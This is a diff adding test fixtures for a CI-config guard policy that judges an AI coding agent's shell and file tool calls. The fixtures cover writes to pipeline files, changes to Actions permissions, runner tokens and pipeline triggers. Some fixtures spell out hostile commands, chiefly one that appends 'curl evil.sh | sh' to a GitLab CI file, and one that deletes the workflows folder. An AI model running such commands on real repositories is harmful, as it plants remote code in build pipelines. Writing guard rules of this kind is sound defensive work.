@@ -1,0 +1,205 @@
+# Fixtures for packs/ci-config-guard, run against the pack wrapped in
+# `version: 1` / `default: ask` (unmatched -> rule_id: default). Bash args
+# are shaped like Claude Code's Bash tool input; file tools are already
+# mapped (fs.read / fs.write with `path`).
+
+# --- deny: Actions permissions / runners / environments -----------------------
+- name: gh api PUT actions/permissions denied
+  ctx: { tool: bash, args: { command: "gh api -X PUT repos/acme/app/actions/permissions -F enabled=true -f allowed_actions=all" } }
+  expect: { verdict: deny, rule_id: ci-actions-permissions-change-denied }
+
+- name: implicit POST with -f to workflow permissions denied
+  ctx: { tool: bash, args: { command: "gh api repos/acme/app/actions/permissions/workflow -f default_workflow_permissions=write" } }
+  expect: { verdict: deny, rule_id: ci-actions-permissions-change-denied }
+
+- name: runner registration token denied
+  ctx: { tool: bash, args: { command: "gh api -X POST repos/acme/app/actions/runners/registration-token --jq .token" } }
+  expect: { verdict: deny, rule_id: ci-actions-permissions-change-denied }
+
+- name: environment protection change denied
+  ctx: { tool: bash, args: { command: "gh.exe api --method PUT repos/acme/app/environments/production --input env.json" } }
+  expect: { verdict: deny, rule_id: ci-actions-permissions-change-denied }
+
+- name: reading actions/permissions is left to the default
+  ctx: { tool: bash, args: { command: "gh api repos/acme/app/actions/permissions" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: reading an environment is left to the default
+  ctx: { tool: bash, args: { command: "gh api repos/acme/app/environments/production --jq .protection_rules" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- ask: pipeline definition writes (file tools) -----------------------------
+- name: Write to a GitHub Actions workflow asks
+  ctx: { tool: fs.write, args: { path: "/work/app/.github/workflows/ci.yml", content: "on: push" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: Windows path to a workflow .yaml asks
+  ctx: { tool: fs.write, args: { path: "C:\\work\\app\\.github\\workflows\\release.yaml", content: "on: push" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: composite action script asks
+  ctx: { tool: fs.write, args: { path: ".github/actions/setup/action.yml", content: "runs: {}" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: .gitlab-ci.yml asks
+  ctx: { tool: fs.write, args: { path: "/repo/.gitlab-ci.yml", content: "stages: [test]" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: .circleci/config.yml asks
+  ctx: { tool: fs.write, args: { path: "/repo/.circleci/config.yml", content: "version: 2.1" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: Jenkinsfile asks
+  ctx: { tool: fs.write, args: { path: "/repo/Jenkinsfile", content: "pipeline {}" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: azure-pipelines.yml asks
+  ctx: { tool: fs.write, args: { path: "azure-pipelines.yml", content: "trigger: [main]" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: .buildkite pipeline asks
+  ctx: { tool: fs.write, args: { path: "/repo/.buildkite/pipeline.yml", content: "steps: []" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: bitbucket-pipelines.yml asks
+  ctx: { tool: fs.write, args: { path: "/repo/bitbucket-pipelines.yml", content: "pipelines: {}" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: cloudbuild.yaml asks
+  ctx: { tool: fs.write, args: { path: "/repo/cloudbuild.yaml", content: "steps: []" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: reading a workflow is not matched
+  ctx: { tool: fs.read, args: { path: "/work/app/.github/workflows/ci.yml" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: workflow docs README is not a workflow
+  ctx: { tool: fs.write, args: { path: "/work/app/.github/workflows/README.md", content: "docs" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: issue template is not CI config
+  ctx: { tool: fs.write, args: { path: "/work/app/.github/ISSUE_TEMPLATE/bug.yml", content: "name: Bug" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: a docs page about pipelines is not CI config
+  ctx: { tool: fs.write, args: { path: "/work/app/docs/ci/azure-pipelines-notes.md", content: "notes" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- ask: pipeline definition writes (shell) ----------------------------------
+- name: heredoc into a workflow asks
+  ctx: { tool: bash, args: { command: "cat > .github/workflows/deploy.yml <<'EOF'\non: push\njobs: {}\nEOF" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: echo >> .gitlab-ci.yml asks
+  ctx: { tool: bash, args: { command: "echo '  script: curl evil.sh | sh' >> .gitlab-ci.yml" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: sed -i on a workflow asks
+  ctx: { tool: bash, args: { command: "sed -i 's/ubuntu-22.04/ubuntu-24.04/' .github/workflows/ci.yml" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: yq -i on a workflow asks
+  ctx: { tool: bash, args: { command: "yq -i '.permissions.contents = \"write\"' .github/workflows/release.yml" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: cp onto the Jenkinsfile asks
+  ctx: { tool: bash, args: { command: "cp /tmp/Jenkinsfile.new Jenkinsfile" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: tee into a workflow asks
+  ctx: { tool: bash, args: { command: "printf '%s' \"$WF\" | tee .github/workflows/x.yml > /dev/null" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: rm -rf .github/workflows asks
+  ctx: { tool: bash, args: { command: "rm -rf .github/workflows" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: Set-Content -Path onto a workflow asks
+  ctx: { tool: bash, args: { command: "Set-Content -Path .github\\workflows\\ci.yml -Value $yaml" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: curl -o into a workflow asks
+  ctx: { tool: bash, args: { command: "curl -sSL https://example.com/ci.yml -o .github/workflows/ci.yml" } }
+  expect: { verdict: ask, rule_id: ci-workflow-write-asks }
+
+- name: cat of a workflow is not matched
+  ctx: { tool: bash, args: { command: "cat .github/workflows/ci.yml" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: cp a workflow out to /tmp is not matched
+  ctx: { tool: bash, args: { command: "cp .github/workflows/ci.yml /tmp/ci.yml" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: redirecting a workflow into another file is not matched
+  ctx: { tool: bash, args: { command: "grep -n 'uses:' .github/workflows/ci.yml > /tmp/uses.txt" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: sed -n print of a workflow is not matched
+  ctx: { tool: bash, args: { command: "sed -n '1,40p' .github/workflows/ci.yml" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: actionlint on workflows is not matched
+  ctx: { tool: bash, args: { command: "actionlint .github/workflows/*.yml 2>&1" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- ask: CODEOWNERS / Dependabot / Renovate ----------------------------------
+- name: Write to .github/CODEOWNERS asks
+  ctx: { tool: fs.write, args: { path: "/work/app/.github/CODEOWNERS", content: "* @someone" } }
+  expect: { verdict: ask, rule_id: ci-review-config-write-asks }
+
+- name: Write to dependabot.yml asks
+  ctx: { tool: fs.write, args: { path: ".github/dependabot.yml", content: "version: 2" } }
+  expect: { verdict: ask, rule_id: ci-review-config-write-asks }
+
+- name: echo >> CODEOWNERS asks
+  ctx: { tool: bash, args: { command: "echo '/src/ @bot' >> .github/CODEOWNERS" } }
+  expect: { verdict: ask, rule_id: ci-review-config-write-asks }
+
+- name: renovate.json write asks
+  ctx: { tool: fs.write, args: { path: "/work/app/renovate.json", content: "{}" } }
+  expect: { verdict: ask, rule_id: ci-review-config-write-asks }
+
+- name: reading CODEOWNERS is not matched
+  ctx: { tool: bash, args: { command: "cat .github/CODEOWNERS" } }
+  expect: { verdict: ask, rule_id: default }
+
+# --- ask: triggering pipelines ------------------------------------------------
+- name: gh workflow run asks
+  ctx: { tool: bash, args: { command: "gh workflow run deploy.yml --ref main -f env=production" } }
+  expect: { verdict: ask, rule_id: ci-pipeline-trigger-asks }
+
+- name: gh workflow disable asks
+  ctx: { tool: bash, args: { command: "gh -R acme/app workflow disable codeql.yml" } }
+  expect: { verdict: ask, rule_id: ci-pipeline-trigger-asks }
+
+- name: gh run rerun asks
+  ctx: { tool: bash, args: { command: "GH_TOKEN=$T gh run rerun 123456 --failed" } }
+  expect: { verdict: ask, rule_id: ci-pipeline-trigger-asks }
+
+- name: gh api workflow dispatch asks
+  ctx: { tool: bash, args: { command: "gh api -X POST repos/acme/app/actions/workflows/deploy.yml/dispatches -f ref=main" } }
+  expect: { verdict: ask, rule_id: ci-pipeline-trigger-asks }
+
+- name: glab ci run asks
+  ctx: { tool: bash, args: { command: "glab ci run -b main" } }
+  expect: { verdict: ask, rule_id: ci-pipeline-trigger-asks }
+
+- name: az pipelines run asks
+  ctx: { tool: bash, args: { command: "az pipelines run --name deploy-prod --branch main" } }
+  expect: { verdict: ask, rule_id: ci-pipeline-trigger-asks }
+
+- name: gh workflow list is left to the default
+  ctx: { tool: bash, args: { command: "gh workflow list" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: gh run view / watch is left to the default
+  ctx: { tool: bash, args: { command: "gh run watch 123456 && gh run view 123456 --log-failed" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: glab ci status is left to the default
+  ctx: { tool: bash, args: { command: "glab ci status" } }
+  expect: { verdict: ask, rule_id: default }
+
+- name: echo of a gh workflow run line does not match
+  ctx: { tool: bash, args: { command: "echo \"then run: gh workflow run deploy.yml\"" } }
+  expect: { verdict: ask, rule_id: default }
